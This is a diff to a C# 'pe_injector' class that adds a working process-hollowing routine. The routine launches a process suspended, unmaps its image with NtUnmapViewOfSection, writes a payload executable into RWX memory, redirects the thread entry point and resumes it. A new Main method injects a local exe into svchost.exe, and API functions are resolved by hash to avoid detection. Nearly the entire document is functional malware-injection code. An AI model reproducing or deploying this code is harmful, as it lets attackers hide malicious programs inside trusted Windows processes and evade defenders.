@@ -1,8 +1,9 @@
 ﻿using System;
 using System.Diagnostics;
+using System.IO;
 using System.Runtime.InteropServices;
 
-namespace A
+namespace qapc_injection
 {
     unsafe public class pe_injector
     {
@@ -456,6 +457,19 @@ namespace A
 
         #endregion
 
+        #region NtUnmapViewOfSection 
+
+        #region Definition
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        private delegate int t_NtUnmapViewOfSection(IntPtr ProcessHandle, uint BaseAddress);
+
+        #endregion  
+
+        private static t_NtUnmapViewOfSection NtUnmapViewOfSection;
+
+        #endregion
+
         #region VirtualAllocEx
 
         #region Definition
@@ -632,6 +646,7 @@ namespace A
             CreateProcessW = LoadFunction<t_CreateProcessW>(lpKernel32, FNVHash("CreateProcessW"));
             GetThreadContext = LoadFunction<t_GetThreadContext>(lpKernel32, FNVHash("GetThreadContext"));
             ReadProcessMemory = LoadFunction<t_ReadProcessMemory>(lpKernel32, FNVHash("ReadProcessMemory"));
+            NtUnmapViewOfSection = LoadFunction<t_NtUnmapViewOfSection>(lpNtdll, FNVHash("NtUnmapViewOfSection"));
             VirtualAllocEx = LoadFunction<t_VirtualAllocEx>(lpKernel32, FNVHash("VirtualAllocEx"));
             VirtualProtectEx = LoadFunction<t_VirtualProtectEx>(lpKernel32, FNVHash("VirtualProtectEx"));
             VirtualQueryEx = LoadFunction<t_VirtualQueryEx>(lpKernel32, FNVHash("VirtualQueryEx"));
@@ -640,7 +655,233 @@ namespace A
             SetThreadContext = LoadFunction<t_SetThreadContext>(lpKernel32, FNVHash("SetThreadContext"));
             ResumeThread = LoadFunction<t_ResumeThread>(lpKernel32, FNVHash("ResumeThread"));
         }
-            
+
+        [DllImport("Kernel32.dll")]
+        private static extern void SetLastError(uint dwErrorCode);
+
+        #region OLD
+
+        private static bool Run(byte[] lpExe,
+                                string pszApplicationPath,
+                                string pszCmdLine = default(string))
+        {
+
+            SetLastError(0);
+
+            pszApplicationPath = string.Format("\"{0}\"", pszApplicationPath);
+
+            if (!string.IsNullOrEmpty(pszCmdLine))
+                pszApplicationPath = string.Join(" ", new string[] { pszApplicationPath, pszCmdLine });
+
+            STARTUPINFO lpStartupInfo = new STARTUPINFO();
+            PROCESS_INFORMATION lpProcessInformation = new PROCESS_INFORMATION();
+
+            bool bResult = CreateProcessW(
+                                null,
+                                pszApplicationPath,
+                                IntPtr.Zero,
+                                IntPtr.Zero,
+                                false,
+                                0x04,
+                                IntPtr.Zero,
+                                IntPtr.Zero,
+                                ref lpStartupInfo,
+                                out lpProcessInformation);
+
+            if (!bResult)
+                goto __Cleanup;
+
+            CONTEXT CTX = new CONTEXT();
+            CTX.ContextFlags = (uint)CONTEXT_FLAGS.CONTEXT_ALL;
+
+            bResult = GetThreadContext(lpProcessInformation.hThread, ref CTX);
+
+            if (!bResult)
+                goto __Cleanup;
+
+            byte[] lpTargetImageBase = new byte[4];
+            IntPtr dwBytesRead = IntPtr.Zero;
+
+            bResult = ReadProcessMemory(
+                            lpProcessInformation.hProcess,
+                            (IntPtr)(CTX.Ebx + 0x8),
+                            lpTargetImageBase,
+                            0x4,
+                            out dwBytesRead);
+
+            if (!bResult)
+                goto __Cleanup;
+
+            uint dwForeignImageBase = BitConverter.ToUInt32(lpTargetImageBase, 0);
+            uint dwPayloadImageBase = 0;
+
+            fixed (byte* lpModuleBase = &lpExe[0])
+            {
+                uint e_lfanew = *(lpModuleBase + 0x3c);
+                dwPayloadImageBase = *(uint*)(lpModuleBase + e_lfanew + 0x34);
+            }
+
+            Console.WriteLine("Payload ImageBase: 0x{0}", dwPayloadImageBase.ToString("X4"));
+            Console.WriteLine("Foreign ImageBase: 0x{0}", dwForeignImageBase.ToString("X4"));
+            Console.ReadLine();
+
+            if (dwForeignImageBase != dwPayloadImageBase)
+            {
+                int NtStatus = NtUnmapViewOfSection(lpProcessInformation.hProcess, dwForeignImageBase);
+
+                Console.WriteLine("NtUnmapViewOfSection Result: 0x{0}", NtStatus.ToString("X4"));
+                Console.ReadLine();
+
+                bResult = NtStatus >= 0 ? true : false;
+
+                if (!bResult)
+                    goto __Cleanup;
+            }
+
+            uint dwSizeOfImage = 0;
+            ushort wSizeOfOptionalHeaders = 0;
+            ushort wNumberOfSections = 0;
+
+            fixed (byte* lpModuleBase = &lpExe[0])
+            {
+                uint e_lfanew = *(lpModuleBase + 0x3c);
+                wNumberOfSections = *(ushort*)(lpModuleBase + e_lfanew + 0x6);
+                wSizeOfOptionalHeaders = *(ushort*)(lpModuleBase + e_lfanew + 0x14);
+                dwSizeOfImage = *(uint*)(lpModuleBase + e_lfanew + 0x50);
+            }
+
+            IntPtr lpImageBase = VirtualAllocEx(
+                                        lpProcessInformation.hProcess,
+                                        (IntPtr)dwPayloadImageBase,
+                                        dwSizeOfImage,
+                                        0x3000,
+                                        0x40);
+
+            bResult = lpImageBase != IntPtr.Zero ? true : false;
+
+            Console.WriteLine("Alloc at: 0x{0}", lpImageBase.ToInt32().ToString("X4"));
+            Console.WriteLine("VirtualAllocEx Result: {0}\nError Code: {1}", bResult, Marshal.GetLastWin32Error());
+            Console.ReadLine();
+
+            if (!bResult)
+                goto __Cleanup; // Fail Alloc Loop?
+
+            uint dwNumberOfBytesWritten = 0;
+
+            bResult = WriteProcessMemory(
+                                lpProcessInformation.hProcess,
+                                lpImageBase,
+                                lpExe,
+                                wSizeOfOptionalHeaders,
+                                ref dwNumberOfBytesWritten);
+
+            bResult = (bResult && dwNumberOfBytesWritten == wSizeOfOptionalHeaders) ? true : false;
+
+            Console.WriteLine("WriteProcessMemory (Headers) Result: {0}\nError Code: {1}", bResult, Marshal.GetLastWin32Error());
+            Console.ReadLine();
+
+            if (!bResult)
+                goto __Cleanup;
+
+            for (int i = 0; i < wNumberOfSections; i++)
+            {
+                uint VirtualAddress = 0;
+                uint SizeOfRawData = 0;
+                uint PointerToRawData = 0;
+
+                fixed (byte* lpModuleBase = &lpExe[0])
+                {
+                    uint e_lfanew = *(lpModuleBase + 0x3c);
+                    byte* ishBase = lpModuleBase + e_lfanew + 0xF8 + (i * 0x28);
+                    VirtualAddress = *(uint*)(ishBase + 0xc);
+                    SizeOfRawData = *(uint*)(ishBase + 0x10);
+                    PointerToRawData = *(uint*)(ishBase + 0x14);
+                }
+
+                Console.WriteLine("ISH VirtualAddress: 0x{0}", VirtualAddress.ToString("X4"));
+                Console.WriteLine("ISH SizeOfRawData: 0x{0}", SizeOfRawData.ToString("X4"));
+                Console.WriteLine("ISH PointerToRawData: 0x{0}", PointerToRawData.ToString("X4"));
+                Console.ReadLine();
+
+                byte[] lpBuffer = new byte[SizeOfRawData];
+                Buffer.BlockCopy(lpExe, (int)PointerToRawData, lpBuffer, 0, (int)SizeOfRawData);
+
+                bResult = WriteProcessMemory(
+                                    lpProcessInformation.hProcess,
+                                    (IntPtr)((uint)lpImageBase + VirtualAddress),
+                                    lpBuffer,
+                                    SizeOfRawData,
+                                    ref dwNumberOfBytesWritten);
+
+                bResult = (bResult && dwNumberOfBytesWritten == SizeOfRawData) ? true : false;
+
+                Console.WriteLine("WriteProcessMemory (Sections) Result: {0}\nError Code: {1}", bResult, Marshal.GetLastWin32Error());
+                Console.ReadLine();
+
+                if (!bResult)
+                    goto __Cleanup;
+            }
+
+            uint dwAddressOfEntryPoint = 0;
+
+            fixed (byte* lpModuleBase = &lpExe[0])
+            {
+                uint e_lfanew = *(lpModuleBase + 0x3c);
+                dwAddressOfEntryPoint = *(uint*)(lpModuleBase + e_lfanew + 0x28);
+            }
+
+            Console.WriteLine("New ImageBase: 0x{0}", lpImageBase.ToString("X4"));
+            Console.ReadLine();
+
+            CTX.Eax = (uint)lpImageBase + dwAddressOfEntryPoint;
+
+            Console.WriteLine("Address of New Foreign EntryPoint: 0x{0}", CTX.Eax.ToString("X4"));
+            Console.ReadLine();
+
+            byte[] pebImageBaseAddress = BitConverter.GetBytes((uint)lpImageBase);
+
+            bResult = WriteProcessMemory(
+                                lpProcessInformation.hProcess,
+                                (IntPtr)(CTX.Ebx + 0x8),
+                                pebImageBaseAddress,
+                                sizeof(uint),
+                                ref dwNumberOfBytesWritten);
+
+            bResult = (bResult && dwNumberOfBytesWritten == sizeof(uint)) ? true : false;
+
+            Console.WriteLine("WriteProcessMemory (ImageBaseAddress Field) Result: {0}\nError Code: {1}", bResult, Marshal.GetLastWin32Error());
+            Console.ReadLine();
+
+            if (!bResult)
+                goto __Cleanup;
+
+            bResult = SetThreadContext(lpProcessInformation.hThread, ref CTX);
+
+            Console.WriteLine("SetThreadContext Result: {0}\nError Code: {1}", bResult, Marshal.GetLastWin32Error());
+            Console.ReadLine();
+
+            if (!bResult)
+                goto __Cleanup;
+
+            bResult = ResumeThread(lpProcessInformation.hThread) != -1 ? true : false;
+
+            Console.WriteLine("ResumeThread Result: {0}\nError Code: {1}", bResult, Marshal.GetLastWin32Error());
+            Console.ReadLine();
+
+            if (!bResult)
+                goto __Cleanup;
+
+            __Cleanup:
+            {
+                Process.GetProcessById((int)lpProcessInformation.dwProcessId).Kill();
+                Console.ReadLine();
+            }
+
+            return bResult;
+        }
+
+        #endregion
+
         private struct HostProcessInfo
         {
             public STARTUPINFO SI;
@@ -725,14 +966,14 @@ namespace A
             return bResult;
         }
 
-        private static bool Run2(byte[] lpExe, string pszApplicationPath, string pszCmdLine)
+        private static bool Run2(byte[] lpExe, string pszApplicationPath, string pszCmdLine = default(string))
         {
             bool bResult = false;
 
             pszApplicationPath = string.Format("\"{0}\"", pszApplicationPath);
 
-            //if (!string.IsNullOrEmpty(pszCmdLine))
-            //    pszApplicationPath = string.Join(" ", new string[] { pszApplicationPath, pszCmdLine });
+            if (!string.IsNullOrEmpty(pszCmdLine))
+                pszApplicationPath = string.Join(" ", new string[] { pszApplicationPath, pszCmdLine });
 
             byte* lpExeBase;
 
@@ -792,7 +1033,7 @@ namespace A
                         0x40);
 
             bResult = v != IntPtr.Zero; //don't need ternarys when using comparison operators, js
-
+            
             //if (v != (IntPtr)pINH.OptionalHeader.ImageBase)
             //    Debugger.Break();
             // so v == 0? lol i thought i caught that
@@ -802,7 +1043,7 @@ namespace A
 
             if (!bResult)
                 return false;
-
+           
             //  }
 
             if ((uint)v == 0)
@@ -889,12 +1130,24 @@ namespace A
             return bResult;
         }
 
-        public static void RunExecRoutine(byte[] lpExe, string pszApplicationPath, string pszCmdLine)
+        public static void Main(string[] args)
         {
-            bool bRet = false;
-
             InitAPI();
 
+            string pszProcessName = Path.Combine(
+                                  Environment.GetFolderPath(Environment.SpecialFolder.System),
+                                  "svchost.exe");
+
+
+            byte[] lpFileBuffer = File.ReadAllBytes("C:\\Users\\Admin\\Desktop\\bintext.exe");
+
+
+            Run2(lpFileBuffer, pszProcessName);
+        }
+
+        private static void RunExecRoutine(byte[] lpExe, string pszApplicationPath, string pszCmdLine = default(string))
+        {
+            bool bRet = false;
             for (int i = 0; i < 5; i++)
             {
                 bRet = Run2(lpExe, pszApplicationPath, pszCmdLine);
